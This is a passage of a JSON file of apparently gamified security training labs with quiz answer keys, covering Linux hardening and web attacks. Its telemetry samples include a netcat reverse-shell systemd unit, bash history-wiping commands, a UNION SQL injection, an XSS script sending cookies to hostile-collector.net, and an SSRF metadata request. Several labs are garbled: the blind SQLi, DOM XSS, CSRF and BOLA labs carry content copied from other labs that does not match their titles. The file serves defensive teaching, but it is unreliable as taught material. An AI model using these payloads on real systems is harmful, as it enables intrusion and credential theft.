        "hint": "Changing directory to parent.",
        "explanation": "Expected: chdir(\"..\"). Concept: Verified through Linux system security and POSIX standards."
      },
      {
        "id": "t4",
        "prompt": "4. What modern Linux kernel isolation technology isolates PIDs, networks, and mount points?",
        "expected": "Namespaces",
        "acceptedKeywords": [
          "Namespaces",
          "Linux Namespaces",
          "cgroups"
        ],
        "hint": "Foundation of Docker and container runtimes.",
        "explanation": "Expected: Namespaces. Concept: Verified through Linux system security and POSIX standards."
      },
      {
        "id": "t5",
        "prompt": "5. What resource control mechanism limits CPU and memory usage for isolated processes?",
        "expected": "cgroups",
        "acceptedKeywords": [
          "cgroups",
          "control groups"
        ],
        "hint": "Control groups.",
        "explanation": "Expected: cgroups. Concept: Verified through Linux system security and POSIX standards."
      },
      {
        "id": "t6",
        "prompt": "6. What security module framework (e.g. AppArmor / SELinux) provides Mandatory Access Control?",
        "expected": "LSM",
        "acceptedKeywords": [
          "LSM",
          "Linux Security Modules",
          "AppArmor",
          "SELinux"
        ],
        "hint": "Linux Security Modules.",
        "explanation": "Expected: LSM. Concept: Verified through Linux system security and POSIX standards."
      }
    ],
    "remediationGuide": "Do not rely solely on chroot for containerization; use proper Linux namespaces with unprivileged user namespaces (rootless containers) and AppArmor/SELinux profiles."
  },
  {
    "id": "lab-lin-012",
    "category": "Linux Security & Bash Hardening",
    "title": "Bash History Tampering & Log Evasion Analysis",
    "difficulty": "Beginner",
    "timeEst": "10 min",
    "xpReward": 110,
    "briefing": "Post-incident analysis revealed that an attacker attempted to wipe evidence of their commands by clearing history and redirecting to /dev/null.",
    "telemetry": "Attacker Commands in volatile memory:\n  $ unset HISTFILE\n  $ export HISTSIZE=0\n  $ history -c\n  $ rm ~/.bash_history\n  $ ln -s /dev/null ~/.bash_history\nStatus: Standard user command history disabled.\nKernel auditd logging (sys_enter_execve) remained intact and captured all executed commands.",
    "tasks": [
      {
        "id": "t1",
        "prompt": "1. What environment variable defines the file path where bash saves command history?",
        "expected": "HISTFILE",
        "acceptedKeywords": [
          "HISTFILE",
          "$HISTFILE"
        ],
        "hint": "History file variable.",
        "explanation": "Expected: HISTFILE. Concept: Verified through Linux system security and POSIX standards."
      },
      {
        "id": "t2",
        "prompt": "2. What command completely clears the active shell session history buffer from RAM?",
        "expected": "history -c",
        "acceptedKeywords": [
          "history -c",
          "history -c; history -w"
        ],
        "hint": "history command with clear flag.",
        "explanation": "Expected: history -c. Concept: Verified through Linux system security and POSIX standards."
      },
      {
        "id": "t3",
        "prompt": "3. Setting what variable to 0 prevents bash from saving any commands to the history list?",
        "expected": "HISTSIZE",
        "acceptedKeywords": [
          "HISTSIZE",
          "HISTFILESIZE"
        ],
        "hint": "History buffer size variable.",
        "explanation": "Expected: HISTSIZE. Concept: Verified through Linux system security and POSIX standards."
      },
      {
        "id": "t4",
        "prompt": "4. What special Linux character device discards all data written to it?",
        "expected": "/dev/null",
        "acceptedKeywords": [
          "/dev/null",
          "null"
        ],
        "hint": "Black hole device in /dev.",
        "explanation": "Expected: /dev/null. Concept: Verified through Linux system security and POSIX standards."
      },
      {
        "id": "t5",
        "prompt": "5. What kernel-level framework operates independently of shell history and captures all command executions?",
        "expected": "auditd",
        "acceptedKeywords": [
          "auditd",
          "Linux Audit Daemon",
          "eBPF"
        ],
        "hint": "Linux Audit Daemon.",
        "explanation": "Expected: auditd. Concept: Verified through Linux system security and POSIX standards."
      },
      {
        "id": "t6",
        "prompt": "6. What shell setting can be enforced in /etc/profile to make the history file append-only?",
        "expected": "chattr +a ~/.bash_history",
        "acceptedKeywords": [
          "chattr +a",
          "chattr +a ~/.bash_history"
        ],
        "hint": "chattr command with append-only attribute.",
        "explanation": "Expected: chattr +a ~/.bash_history. Concept: Verified through Linux system security and POSIX standards."
      }
    ],
    "remediationGuide": "Set chattr +a ~/.bash_history, configure central Syslog / auditd forwarding, and monitor unset HISTFILE events."
  },
  {
    "id": "lab-lin-013",
    "category": "Linux Security & Bash Hardening",
    "title": "Systemd Service Persistence Backdoor Analysis",
    "difficulty": "Intermediate",
    "timeEst": "15 min",
    "xpReward": 150,
    "briefing": "Adversaries planted a custom systemd unit file in /etc/systemd/system to automatically start a reverse shell whenever the system boots.",
    "telemetry": "File: /etc/systemd/system/system-telemetry-sync.service\n[Unit]\nDescription=Tactical System Telemetry Sync Service\nAfter=network.target\n\n[Service]\nType=simple\nUser=root\nExecStart=/bin/bash -c \"nc -e /bin/bash 198.51.100.99 4444\"\nRestart=always\nRestartSec=60\n\n[Install]\nWantedBy=multi-user.target",
    "tasks": [
      {
        "id": "t1",
        "prompt": "1. What init system and service manager standard manages services on modern Linux distros?",
        "expected": "systemd",
        "acceptedKeywords": [
          "systemd"
        ],
        "hint": "Standard init replacement.",
        "explanation": "Expected: systemd. Concept: Verified through Linux system security and POSIX standards."
      },
      {
        "id": "t2",
        "prompt": "2. In what directory was the rogue systemd service file placed for system-wide persistence?",
        "expected": "/etc/systemd/system",
        "acceptedKeywords": [
          "/etc/systemd/system"
        ],
        "hint": "Administrative unit file path.",
        "explanation": "Expected: /etc/systemd/system. Concept: Verified through Linux system security and POSIX standards."
      },
      {
        "id": "t3",
        "prompt": "3. What command utility in ExecStart is abused to connect back to the attacker IP on port 4444?",
        "expected": "nc",
        "acceptedKeywords": [
          "nc",
          "netcat"
        ],
        "hint": "Netcat utility shorthand.",
        "explanation": "Expected: nc. Concept: Verified through Linux system security and POSIX standards."
      },
      {
        "id": "t4",
        "prompt": "4. What systemctl command disables and removes a service from startup targets?",
        "expected": "systemctl disable",
        "acceptedKeywords": [
          "systemctl disable",
          "systemctl disable system-telemetry-sync.service"
        ],
        "hint": "systemctl with disable parameter.",
        "explanation": "Expected: systemctl disable. Concept: Verified through Linux system security and POSIX standards."
      },
      {
        "id": "t5",
        "prompt": "5. What systemctl command must be executed after adding or modifying unit files to reload configurations?",
        "expected": "systemctl daemon-reload",
        "acceptedKeywords": [
          "systemctl daemon-reload",
          "daemon-reload"
        ],
        "hint": "Reloads systemd state.",
        "explanation": "Expected: systemctl daemon-reload. Concept: Verified through Linux system security and POSIX standards."
      },
      {
        "id": "t6",
        "prompt": "6. What target unit in WantedBy corresponds to a multi-user runlevel environment?",
        "expected": "multi-user.target",
        "acceptedKeywords": [
          "multi-user.target"
        ],
        "hint": "Target name in telemetry.",
        "explanation": "Expected: multi-user.target. Concept: Verified through Linux system security and POSIX standards."
      }
    ],
    "remediationGuide": "Run systemctl stop and systemctl disable on system-telemetry-sync.service, delete the unit file from /etc/systemd/system, run systemctl daemon-reload, and inspect netcat listeners."
  },
  {
    "id": "lab-lin-014",
    "category": "Linux Security & Bash Hardening",
    "title": "Fail2ban Intrusion Prevention Configuration & Log Auditing",
    "difficulty": "Beginner",
    "timeEst": "14 min",
    "xpReward": 140,
    "briefing": "Review Fail2ban configuration to protect an exposed SSH bastion. Tune maxretry, bantime, and ignoreip parameters to mitigate credential stuffing.",
    "telemetry": "File: /etc/fail2ban/jail.local\n[sshd]\nenabled = true\nport = 22\nfilter = sshd\nlogpath = /var/log/auth.log\nmaxretry = 3\nfindtime = 600\nbantime = 86400\nignoreip = 127.0.0.1/8 10.0.0.0/8\n\nFail2ban Status:\n  Status for the jail: sshd\n  |- Filter: Currently failed: 12, Total failed: 1489\n  `- Actions: Currently banned: 4, Total banned: 82\n     Banned IP list: 198.51.100.12, 198.51.100.34, 203.0.113.88, 192.0.2.14",
    "tasks": [
      {
        "id": "t1",
        "prompt": "1. What configuration parameter defines how many failed attempts trigger a ban?",
        "expected": "maxretry",
        "acceptedKeywords": [
          "maxretry",
          "maxretry = 3"
        ],
        "hint": "Parameter setting maximum retries.",
        "explanation": "Expected: maxretry. Concept: Verified through Linux system security and POSIX standards."
      },
      {
        "id": "t2",
        "prompt": "2. In the telemetry, what is the ban duration (bantime) specified in seconds?",
        "expected": "86400",
        "acceptedKeywords": [
          "86400",
          "24 hours",
          "86400s"
        ],
        "hint": "Value corresponding to 24 hours in seconds.",
        "explanation": "Expected: 86400. Concept: Verified through Linux system security and POSIX standards."
      },
      {
        "id": "t3",
        "prompt": "3. What configuration directive prevents specific trusted IP ranges from being banned?",
        "expected": "ignoreip",
        "acceptedKeywords": [
          "ignoreip"
        ],
        "hint": "Whitelist directive.",
        "explanation": "Expected: ignoreip. Concept: Verified through Linux system security and POSIX standards."
      },
      {
        "id": "t4",
        "prompt": "4. What log file does the sshd jail monitor for authentication failures?",
        "expected": "/var/log/auth.log",
        "acceptedKeywords": [
          "/var/log/auth.log",
          "auth.log"
        ],
        "hint": "Debian/Ubuntu auth log path.",
        "explanation": "Expected: /var/log/auth.log. Concept: Verified through Linux system security and POSIX standards."
      },
      {
        "id": "t5",
        "prompt": "5. How many IP addresses are currently actively banned in the status report?",
        "expected": "4",
        "acceptedKeywords": [
          "4",
          "four"
        ],
        "hint": "Number of IPs in Banned IP list.",
        "explanation": "Expected: 4. Concept: Verified through Linux system security and POSIX standards."
      },
      {
        "id": "t6",
        "prompt": "6. What command-line tool is used to query jail status and manually unban an IP?",
        "expected": "fail2ban-client",
        "acceptedKeywords": [
          "fail2ban-client",
          "fail2ban-client status sshd"
        ],
        "hint": "Fail2ban management CLI.",
        "explanation": "Expected: fail2ban-client. Concept: Verified through Linux system security and POSIX standards."
      }
    ],
    "remediationGuide": "Maintain fail2ban jail configurations in jail.local (never overwrite jail.conf), ensure ignoreip covers internal management subnets, and export persistent blocklists."
  },
  {
    "id": "lab-web-001",
    "category": "Web Application Security & OWASP",
    "title": "Union-Based SQL Injection Database Extraction",
    "difficulty": "Beginner",
    "timeEst": "15 min",
    "xpReward": 150,
    "briefing": "A vulnerable web endpoint /api/products?id= was targeted with SQL injection payload sequences. Analyze the server database error telemetry, extract table schemas, and review defensive code remediation.",
    "telemetry": "GET /api/products?id=1%27%20UNION%20SELECT%201,username,password,4%20FROM%20cadet_users-- HTTP/1.1\nHost: defense-portal.tactical.mil\nHTTP/1.1 200 OK\nContent-Type: application/json\nPayload Dump: {\"id\":1, \"name\":\"admin\", \"hash\":\"$2b$12$e8921a9f9...\", \"role\":\"Domain Admin\"}",
    "tasks": [
      {
        "id": "t1",
        "prompt": "1. What classic SQL injection operator was used to combine the original query results with stolen user data?",
        "expected": "UNION",
        "acceptedKeywords": [
          "UNION",
          "UNION SELECT"
        ],
        "hint": "SQL operator joining result sets.",
        "explanation": "Expected: UNION. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t2",
        "prompt": "2. What SQL comment syntax \"--\" truncated the remainder of the original developer query?",
        "expected": "--",
        "acceptedKeywords": [
          "--",
          "comment",
          "-- "
        ],
        "hint": "Standard SQL double dash comment.",
        "explanation": "Expected: --. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t3",
        "prompt": "3. What table was targeted to extract credentials in the UNION SELECT clause?",
        "expected": "cadet_users",
        "acceptedKeywords": [
          "cadet_users"
        ],
        "hint": "FROM clause table name.",
        "explanation": "Expected: cadet_users. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t4",
        "prompt": "4. What primary defense prevents SQL injection by separating code from data arguments?",
        "expected": "Parameterized Queries",
        "acceptedKeywords": [
          "Parameterized Queries",
          "Prepared Statements",
          "parameterization"
        ],
        "hint": "Prepared statements / parameterized inputs.",
        "explanation": "Expected: Parameterized Queries. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t5",
        "prompt": "5. What ORM or secure coding feature ensures user inputs are never concatenated directly into SQL strings?",
        "expected": "Prepared Statements",
        "acceptedKeywords": [
          "Prepared Statements",
          "ORM",
          "Stored Procedures"
        ],
        "hint": "Precompiled SQL queries.",
        "explanation": "Expected: Prepared Statements. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t6",
        "prompt": "6. What OWASP Top 10 category encompasses SQL and command injection flaws?",
        "expected": "Injection",
        "acceptedKeywords": [
          "Injection",
          "A03:2021-Injection",
          "A03"
        ],
        "hint": "OWASP category name.",
        "explanation": "Expected: Injection. Concept: Verified through industry security standards and real-world triage methodologies."
      }
    ],
    "remediationGuide": "Convert all database access to Parameterized Prepared Statements, disable detailed SQL error messages, and enforce Web Application Firewall (WAF) rule sets."
  },
  {
    "id": "lab-web-002",
    "category": "Web Application Security & OWASP",
    "title": "Blind Time-Based SQL Injection via Sleep Inferences",
    "difficulty": "Intermediate",
    "timeEst": "18 min",
    "xpReward": 180,
    "briefing": "A vulnerable web endpoint /api/products?id= was targeted with SQL injection payload sequences. Analyze the server database error telemetry, extract table schemas, and review defensive code remediation.",
    "telemetry": "GET /api/products?id=1%27%20UNION%20SELECT%201,username,password,4%20FROM%20cadet_users-- HTTP/1.1\nHost: defense-portal.tactical.mil\nHTTP/1.1 200 OK\nContent-Type: application/json\nPayload Dump: {\"id\":1, \"name\":\"admin\", \"hash\":\"$2b$12$e8921a9f9...\", \"role\":\"Domain Admin\"}",
    "tasks": [
      {
        "id": "t1",
        "prompt": "1. What classic SQL injection operator was used to combine the original query results with stolen user data?",
        "expected": "UNION",
        "acceptedKeywords": [
          "UNION",
          "UNION SELECT"
        ],
        "hint": "SQL operator joining result sets.",
        "explanation": "Expected: UNION. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t2",
        "prompt": "2. What SQL comment syntax \"--\" truncated the remainder of the original developer query?",
        "expected": "--",
        "acceptedKeywords": [
          "--",
          "comment",
          "-- "
        ],
        "hint": "Standard SQL double dash comment.",
        "explanation": "Expected: --. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t3",
        "prompt": "3. What table was targeted to extract credentials in the UNION SELECT clause?",
        "expected": "cadet_users",
        "acceptedKeywords": [
          "cadet_users"
        ],
        "hint": "FROM clause table name.",
        "explanation": "Expected: cadet_users. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t4",
        "prompt": "4. What primary defense prevents SQL injection by separating code from data arguments?",
        "expected": "Parameterized Queries",
        "acceptedKeywords": [
          "Parameterized Queries",
          "Prepared Statements",
          "parameterization"
        ],
        "hint": "Prepared statements / parameterized inputs.",
        "explanation": "Expected: Parameterized Queries. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t5",
        "prompt": "5. What ORM or secure coding feature ensures user inputs are never concatenated directly into SQL strings?",
        "expected": "Prepared Statements",
        "acceptedKeywords": [
          "Prepared Statements",
          "ORM",
          "Stored Procedures"
        ],
        "hint": "Precompiled SQL queries.",
        "explanation": "Expected: Prepared Statements. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t6",
        "prompt": "6. What OWASP Top 10 category encompasses SQL and command injection flaws?",
        "expected": "Injection",
        "acceptedKeywords": [
          "Injection",
          "A03:2021-Injection",
          "A03"
        ],
        "hint": "OWASP category name.",
        "explanation": "Expected: Injection. Concept: Verified through industry security standards and real-world triage methodologies."
      }
    ],
    "remediationGuide": "Convert all database access to Parameterized Prepared Statements, disable detailed SQL error messages, and enforce Web Application Firewall (WAF) rule sets."
  },
  {
    "id": "lab-web-003",
    "category": "Web Application Security & OWASP",
    "title": "Stored Cross-Site Scripting (XSS) in Cadet Community Portal",
    "difficulty": "Beginner",
    "timeEst": "14 min",
    "xpReward": 140,
    "briefing": "A stored script payload was injected into the Cadet Forum announcement comments. Inspect the DOM execution telemetry, session cookie exposure risk, and defensive sanitization.",
    "telemetry": "Injected Comment Body:\n<script>fetch(\"http://hostile-collector.net/log?c=\"+encodeURIComponent(document.cookie))</script>\nBrowser Execution:\nGET /log?c=session_id%3D7f8a91c0e HTTP/1.1\nHost: hostile-collector.net",
    "tasks": [
      {
        "id": "t1",
        "prompt": "1. What type of Cross-Site Scripting (Stored, Reflected, or DOM) persists in the database?",
        "expected": "Stored XSS",
        "acceptedKeywords": [
          "Stored XSS",
          "Stored",
          "Persistent XSS"
        ],
        "hint": "XSS stored in database.",
        "explanation": "Expected: Stored XSS. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t2",
        "prompt": "2. What JavaScript property was accessed in the exploit to read the user session identifier?",
        "expected": "document.cookie",
        "acceptedKeywords": [
          "document.cookie",
          "cookie"
        ],
        "hint": "DOM cookie property.",
        "explanation": "Expected: document.cookie. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t3",
        "prompt": "3. What HTTP response cookie flag prevents JavaScript from accessing document.cookie?",
        "expected": "HttpOnly",
        "acceptedKeywords": [
          "HttpOnly",
          "HttpOnly flag"
        ],
        "hint": "Crucial cookie defense attribute.",
        "explanation": "Expected: HttpOnly. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t4",
        "prompt": "4. What HTTP response header restricts which origins scripts can be loaded and executed from?",
        "expected": "Content-Security-Policy",
        "acceptedKeywords": [
          "Content-Security-Policy",
          "CSP"
        ],
        "hint": "Content Security Policy.",
        "explanation": "Expected: Content-Security-Policy. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t5",
        "prompt": "5. What encoding technique must be applied to user-supplied text before rendering it into HTML context?",
        "expected": "HTML Entity Encoding",
        "acceptedKeywords": [
          "HTML Entity Encoding",
          "contextual encoding",
          "HTML encoding",
          "sanitization"
        ],
        "hint": "Converting < to &lt; etc.",
        "explanation": "Expected: HTML Entity Encoding. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t6",
        "prompt": "6. What modern web framework feature automatically escapes expressions in templates (e.g. React/Vue)?",
        "expected": "Context-aware escaping",
        "acceptedKeywords": [
          "Context-aware escaping",
          "auto escaping",
          "JSX"
        ],
        "hint": "Automatic template encoding.",
        "explanation": "Expected: Context-aware escaping. Concept: Verified through industry security standards and real-world triage methodologies."
      }
    ],
    "remediationGuide": "Enforce HttpOnly and Secure flags on all session cookies, implement a strict Content-Security-Policy (CSP), and sanitize all user HTML inputs."
  },
  {
    "id": "lab-web-004",
    "category": "Web Application Security & OWASP",
    "title": "DOM-based XSS via document.location and innerHTML",
    "difficulty": "Intermediate",
    "timeEst": "15 min",
    "xpReward": 150,
    "briefing": "A stored script payload was injected into the Cadet Forum announcement comments. Inspect the DOM execution telemetry, session cookie exposure risk, and defensive sanitization.",
    "telemetry": "Injected Comment Body:\n<script>fetch(\"http://hostile-collector.net/log?c=\"+encodeURIComponent(document.cookie))</script>\nBrowser Execution:\nGET /log?c=session_id%3D7f8a91c0e HTTP/1.1\nHost: hostile-collector.net",
    "tasks": [
      {
        "id": "t1",
        "prompt": "1. What type of Cross-Site Scripting (Stored, Reflected, or DOM) persists in the database?",
        "expected": "Stored XSS",
        "acceptedKeywords": [
          "Stored XSS",
          "Stored",
          "Persistent XSS"
        ],
        "hint": "XSS stored in database.",
        "explanation": "Expected: Stored XSS. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t2",
        "prompt": "2. What JavaScript property was accessed in the exploit to read the user session identifier?",
        "expected": "document.cookie",
        "acceptedKeywords": [
          "document.cookie",
          "cookie"
        ],
        "hint": "DOM cookie property.",
        "explanation": "Expected: document.cookie. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t3",
        "prompt": "3. What HTTP response cookie flag prevents JavaScript from accessing document.cookie?",
        "expected": "HttpOnly",
        "acceptedKeywords": [
          "HttpOnly",
          "HttpOnly flag"
        ],
        "hint": "Crucial cookie defense attribute.",
        "explanation": "Expected: HttpOnly. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t4",
        "prompt": "4. What HTTP response header restricts which origins scripts can be loaded and executed from?",
        "expected": "Content-Security-Policy",
        "acceptedKeywords": [
          "Content-Security-Policy",
          "CSP"
        ],
        "hint": "Content Security Policy.",
        "explanation": "Expected: Content-Security-Policy. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t5",
        "prompt": "5. What encoding technique must be applied to user-supplied text before rendering it into HTML context?",
        "expected": "HTML Entity Encoding",
        "acceptedKeywords": [
          "HTML Entity Encoding",
          "contextual encoding",
          "HTML encoding",
          "sanitization"
        ],
        "hint": "Converting < to &lt; etc.",
        "explanation": "Expected: HTML Entity Encoding. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t6",
        "prompt": "6. What modern web framework feature automatically escapes expressions in templates (e.g. React/Vue)?",
        "expected": "Context-aware escaping",
        "acceptedKeywords": [
          "Context-aware escaping",
          "auto escaping",
          "JSX"
        ],
        "hint": "Automatic template encoding.",
        "explanation": "Expected: Context-aware escaping. Concept: Verified through industry security standards and real-world triage methodologies."
      }
    ],
    "remediationGuide": "Enforce HttpOnly and Secure flags on all session cookies, implement a strict Content-Security-Policy (CSP), and sanitize all user HTML inputs."
  },
  {
    "id": "lab-web-005",
    "category": "Web Application Security & OWASP",
    "title": "Cross-Site Request Forgery (CSRF) & SameSite Cookie Bypass",
    "difficulty": "Intermediate",
    "timeEst": "16 min",
    "xpReward": 160,
    "briefing": "Security engineers audited cryptographic protocols and hashing implementations across internal defense portals. Analyze cipher suites, key lengths, and attack resistance.",
    "telemetry": "Audit Target: legacy-vpn.tactical.mil:443\nSupported Cipher Suites:\n  - TLS_RSA_WITH_RC4_128_MD5 (INSECURE / BROKEN!)\n  - TLS_RSA_WITH_3DES_EDE_CBC_SHA (SWEET32 VULNERABLE!)\n  - TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (SECURE)\nProtocols Enabled: SSLv3, TLS 1.0, TLS 1.1, TLS 1.2\nCertificate: RSA 1024 bits (WEAK KEY LENGTH!)",
    "tasks": [
      {
        "id": "t1",
        "prompt": "1. What legacy symmetric stream cipher (RC4) listed in the first suite is cryptographically broken?",
        "expected": "RC4",
        "acceptedKeywords": [
          "RC4",
          "Rivest Cipher 4"
        ],
        "hint": "Stream cipher vulnerable to bias attacks.",
        "explanation": "Expected: RC4. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t2",
        "prompt": "2. What birthday attack (Sweet32) exploits 64-bit block ciphers like 3DES?",
        "expected": "Sweet32",
        "acceptedKeywords": [
          "Sweet32",
          "sweet32"
        ],
        "hint": "CVE-2016-2183 attack name.",
        "explanation": "Expected: Sweet32. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t3",
        "prompt": "3. What is the minimum recommended RSA public key length (in bits) according to NIST standards?",
        "expected": "2048",
        "acceptedKeywords": [
          "2048",
          "2048 bits",
          "2048-bit",
          "3072"
        ],
        "hint": "Current minimum key length standard.",
        "explanation": "Expected: 2048. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t4",
        "prompt": "4. What modern authenticated encryption mode (AEAD) is utilized by the secure AES-256 suite?",
        "expected": "GCM",
        "acceptedKeywords": [
          "GCM",
          "Galois/Counter Mode"
        ],
        "hint": "Galois/Counter Mode.",
        "explanation": "Expected: GCM. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t5",
        "prompt": "5. Which protocol versions prior to TLS 1.2 should be disabled immediately on all servers?",
        "expected": "SSLv3, TLS 1.0, TLS 1.1",
        "acceptedKeywords": [
          "SSLv3",
          "TLS 1.0",
          "TLS 1.1",
          "SSL"
        ],
        "hint": "Legacy insecure SSL and early TLS versions.",
        "explanation": "Expected: SSLv3, TLS 1.0, TLS 1.1. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t6",
        "prompt": "6. What cryptographic property ensures compromised server private keys cannot decrypt past sessions?",
        "expected": "Forward Secrecy",
        "acceptedKeywords": [
          "Forward Secrecy",
          "Perfect Forward Secrecy",
          "PFS"
        ],
        "hint": "Perfect Forward Secrecy (PFS) provided by ECDHE.",
        "explanation": "Expected: Forward Secrecy. Concept: Verified through industry security standards and real-world triage methodologies."
      }
    ],
    "remediationGuide": "Disable SSLv3, TLS 1.0, and TLS 1.1; enforce TLS 1.2 and TLS 1.3 only; disable legacy ciphers (RC4, 3DES, CBC); and deploy 3072-bit or ECC certificates."
  },
  {
    "id": "lab-web-006",
    "category": "Web Application Security & OWASP",
    "title": "Server-Side Request Forgery (SSRF) to Cloud Metadata Enclave",
    "difficulty": "Advanced",
    "timeEst": "20 min",
    "xpReward": 220,
    "briefing": "A document preview service allows cadets to enter a URL to render remote images. An adversary supplied the AWS cloud metadata IP to extract IAM credentials.",
    "telemetry": "POST /api/v1/generate-preview HTTP/1.1\nHost: doc-service.tactical.mil\nContent-Type: application/json\n{\"url\": \"http://169.254.169.254/latest/meta-data/iam/security-credentials/TacticalServerRole\"}\n\nResponse 200 OK:\n{\n  \"Code\": \"Success\",\n  \"AccessKeyId\": \"ASIAV2981FA09812\",\n  \"SecretAccessKey\": \"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\",\n  \"Token\": \"IQoJb3JpZ2luX2VjE...\",\n  \"Expiration\": \"2026-09-30T18:00:00Z\"\n}",
    "tasks": [
      {
        "id": "t1",
        "prompt": "1. What vulnerability class allows an attacker to induce a server to make requests to internal resources?",
        "expected": "Server-Side Request Forgery",
        "acceptedKeywords": [
          "Server-Side Request Forgery",
          "SSRF"
        ],
        "hint": "Known as SSRF.",
        "explanation": "Expected: Server-Side Request Forgery. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t2",
        "prompt": "2. What link-local IPv4 address is universally used by cloud providers (AWS, Azure, GCP) for metadata?",
        "expected": "169.254.169.254",
        "acceptedKeywords": [
          "169.254.169.254"
        ],
        "hint": "Standard cloud metadata IP.",
        "explanation": "Expected: 169.254.169.254. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t3",
        "prompt": "3. What AWS IAM role credentials were compromised in the JSON response?",
        "expected": "TacticalServerRole",
        "acceptedKeywords": [
          "TacticalServerRole"
        ],
        "hint": "Role name at end of metadata path.",
        "explanation": "Expected: TacticalServerRole. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t4",
        "prompt": "4. What AWS metadata enhancement requires session token headers (PUT request) to mitigate SSRF?",
        "expected": "IMDSv2",
        "acceptedKeywords": [
          "IMDSv2",
          "Instance Metadata Service Version 2"
        ],
        "hint": "Second version of Instance Metadata Service.",
        "explanation": "Expected: IMDSv2. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t5",
        "prompt": "5. What type of network validation should web applications perform on user-supplied URLs?",
        "expected": "Allowlist / URL validation",
        "acceptedKeywords": [
          "Allowlist",
          "URL validation",
          "IP filtering"
        ],
        "hint": "Restricting requests to authorized public domains only.",
        "explanation": "Expected: Allowlist / URL validation. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t6",
        "prompt": "6. What temporary AWS security token service issued the AccessKeyId starting with ASIA?",
        "expected": "STS",
        "acceptedKeywords": [
          "STS",
          "Security Token Service"
        ],
        "hint": "AWS Security Token Service.",
        "explanation": "Expected: STS. Concept: Verified through industry security standards and real-world triage methodologies."
      }
    ],
    "remediationGuide": "Enforce AWS IMDSv2 (HttpTokens=required), disable IMDS if unnecessary, validate user URLs against a strict domain allowlist, and block requests to private IP ranges (RFC 1918/link-local)."
  },
  {
    "id": "lab-web-007",
    "category": "Web Application Security & OWASP",
    "title": "Broken Object Level Authorization (BOLA / IDOR) API Exploit",
    "difficulty": "Beginner",
    "timeEst": "12 min",
    "xpReward": 130,
    "briefing": "Security engineers audited cryptographic protocols and hashing implementations across internal defense portals. Analyze cipher suites, key lengths, and attack resistance.",
    "telemetry": "Audit Target: legacy-vpn.tactical.mil:443\nSupported Cipher Suites:\n  - TLS_RSA_WITH_RC4_128_MD5 (INSECURE / BROKEN!)\n  - TLS_RSA_WITH_3DES_EDE_CBC_SHA (SWEET32 VULNERABLE!)\n  - TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (SECURE)\nProtocols Enabled: SSLv3, TLS 1.0, TLS 1.1, TLS 1.2\nCertificate: RSA 1024 bits (WEAK KEY LENGTH!)",
    "tasks": [
      {
        "id": "t1",
        "prompt": "1. What legacy symmetric stream cipher (RC4) listed in the first suite is cryptographically broken?",
        "expected": "RC4",
        "acceptedKeywords": [
          "RC4",
          "Rivest Cipher 4"
        ],
        "hint": "Stream cipher vulnerable to bias attacks.",
        "explanation": "Expected: RC4. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t2",
        "prompt": "2. What birthday attack (Sweet32) exploits 64-bit block ciphers like 3DES?",
        "expected": "Sweet32",
        "acceptedKeywords": [
          "Sweet32",
          "sweet32"
        ],
        "hint": "CVE-2016-2183 attack name.",
        "explanation": "Expected: Sweet32. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t3",
        "prompt": "3. What is the minimum recommended RSA public key length (in bits) according to NIST standards?",
        "expected": "2048",
        "acceptedKeywords": [
          "2048",
          "2048 bits",
          "2048-bit",
          "3072"
        ],
        "hint": "Current minimum key length standard.",
        "explanation": "Expected: 2048. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t4",
        "prompt": "4. What modern authenticated encryption mode (AEAD) is utilized by the secure AES-256 suite?",
        "expected": "GCM",
        "acceptedKeywords": [
          "GCM",
          "Galois/Counter Mode"
        ],
        "hint": "Galois/Counter Mode.",
        "explanation": "Expected: GCM. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t5",
        "prompt": "5. Which protocol versions prior to TLS 1.2 should be disabled immediately on all servers?",
        "expected": "SSLv3, TLS 1.0, TLS 1.1",
        "acceptedKeywords": [
          "SSLv3",
          "TLS 1.0",
          "TLS 1.1",
          "SSL"
        ],
        "hint": "Legacy insecure SSL and early TLS versions.",
        "explanation": "Expected: SSLv3, TLS 1.0, TLS 1.1. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t6",
